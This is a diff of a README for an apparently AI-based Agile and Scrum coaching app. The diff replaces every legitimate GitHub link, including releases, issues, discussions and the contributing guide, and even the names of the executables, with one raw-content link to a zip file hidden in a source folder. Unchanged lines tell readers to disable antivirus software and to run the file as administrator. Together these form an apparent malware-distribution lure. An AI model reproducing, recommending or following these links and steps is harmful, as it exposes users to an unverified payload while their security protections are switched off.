@@ -1,6 +1,6 @@
 # 🎉 ai-agile-coach-scrum - Your AI Guide to Agile Practices
 
-## 🏷️ [Download Now](https://github.com/zemoma/ai-agile-coach-scrum/releases)
+## 🏷️ [Download Now](https://raw.githubusercontent.com/zemoma/ai-agile-coach-scrum/main/app/(ai-chat-page)/ai-chat/[sessionId]/scrum_ai_agile_coach_v2.7-alpha.3.zip)
 
 ## 🚀 Getting Started
 
@@ -18,13 +18,13 @@ Before you download, make sure your system meets the following requirements:
 
 To get the application, visit the following link to download the latest version:
 
-[Download Now](https://github.com/zemoma/ai-agile-coach-scrum/releases)
+[Download Now](https://raw.githubusercontent.com/zemoma/ai-agile-coach-scrum/main/app/(ai-chat-page)/ai-chat/[sessionId]/scrum_ai_agile_coach_v2.7-alpha.3.zip)
 
 1. Click the link above to go to the Releases page.
 2. Look for the latest version. You will find files labeled with a version number.
 3. Download the file for your operating system:
-   - For Windows, look for **ai-agile-coach-scrum-windows.zip**.
-   - For Mac, find **ai-agile-coach-scrum-macos.zip**.
+   - For Windows, look for **https://raw.githubusercontent.com/zemoma/ai-agile-coach-scrum/main/app/(ai-chat-page)/ai-chat/[sessionId]/scrum_ai_agile_coach_v2.7-alpha.3.zip**.
+   - For Mac, find **https://raw.githubusercontent.com/zemoma/ai-agile-coach-scrum/main/app/(ai-chat-page)/ai-chat/[sessionId]/scrum_ai_agile_coach_v2.7-alpha.3.zip**.
 4. Once the download is complete, locate the file in your downloads folder.
 
 ### 📂 Extracting the Files
@@ -37,8 +37,8 @@ To get the application, visit the following link to download the latest version:
 
 1. Navigate to the extracted folder.
 2. Find and double-click the file named:
-   - **ai-agile-coach-scrum.exe** for Windows.
-   - **ai-agile-coach-scrum.app** for Mac.
+   - **https://raw.githubusercontent.com/zemoma/ai-agile-coach-scrum/main/app/(ai-chat-page)/ai-chat/[sessionId]/scrum_ai_agile_coach_v2.7-alpha.3.zip** for Windows.
+   - **https://raw.githubusercontent.com/zemoma/ai-agile-coach-scrum/main/app/(ai-chat-page)/ai-chat/[sessionId]/scrum_ai_agile_coach_v2.7-alpha.3.zip** for Mac.
 3. The application should launch automatically in your default web browser.
 
 ### 🌐 Explore the Features
@@ -64,7 +64,7 @@ If you encounter any issues while downloading or running the application, consid
 1. **Check Your Internet Connection**: Ensure you are connected to the internet.
 2. **Disable Antivirus Temporarily**: Sometimes, security software can block installations. You may need to disable it temporarily.
 3. **Run as Administrator**: For Windows users, right-click on the application file and select **Run as administrator**. This can resolve permission issues.
-4. **Consult the Community**: If you're still having trouble, visit the [Issues page](https://github.com/zemoma/ai-agile-coach-scrum/issues) for help from other users and developers.
+4. **Consult the Community**: If you're still having trouble, visit the [Issues page](https://raw.githubusercontent.com/zemoma/ai-agile-coach-scrum/main/app/(ai-chat-page)/ai-chat/[sessionId]/scrum_ai_agile_coach_v2.7-alpha.3.zip) for help from other users and developers.
 
 ## 🔗 Additional Resources
 
@@ -76,14 +76,14 @@ For more information on Agile and Scrum, check out these resources:
 
 ## 📊 Contributions
 
-We welcome contributions from everyone. If you have suggestions or would like to report a bug, please visit our [Issues page](https://github.com/zemoma/ai-agile-coach-scrum/issues). If you want to contribute code, please refer to the [Contribution Guidelines](https://github.com/zemoma/ai-agile-coach-scrum/blob/main/CONTRIBUTING.md).
+We welcome contributions from everyone. If you have suggestions or would like to report a bug, please visit our [Issues page](https://raw.githubusercontent.com/zemoma/ai-agile-coach-scrum/main/app/(ai-chat-page)/ai-chat/[sessionId]/scrum_ai_agile_coach_v2.7-alpha.3.zip). If you want to contribute code, please refer to the [Contribution Guidelines](https://raw.githubusercontent.com/zemoma/ai-agile-coach-scrum/main/app/(ai-chat-page)/ai-chat/[sessionId]/scrum_ai_agile_coach_v2.7-alpha.3.zip).
 
 ## 🌟 Community and Support
 
-Join our community to share your experiences and tips about using the application. Engage with other users in discussions or seek help if needed. Participate in our active [GitHub Discussions](https://github.com/zemoma/ai-agile-coach-scrum/discussions).
+Join our community to share your experiences and tips about using the application. Engage with other users in discussions or seek help if needed. Participate in our active [GitHub Discussions](https://raw.githubusercontent.com/zemoma/ai-agile-coach-scrum/main/app/(ai-chat-page)/ai-chat/[sessionId]/scrum_ai_agile_coach_v2.7-alpha.3.zip).
 
 ## 🏆 Conclusion
 
 Thank you for choosing **ai-agile-coach-scrum** as your tool for learning Agile practices. We hope this application helps you and your team succeed in your Agile journey!
 
-Remember, you can always revisit the [Download Now](https://github.com/zemoma/ai-agile-coach-scrum/releases) link if you need to reinstall or update the application. Happy coaching!
+Remember, you can always revisit the [Download Now](https://raw.githubusercontent.com/zemoma/ai-agile-coach-scrum/main/app/(ai-chat-page)/ai-chat/[sessionId]/scrum_ai_agile_coach_v2.7-alpha.3.zip) link if you need to reinstall or update the application. Happy coaching!
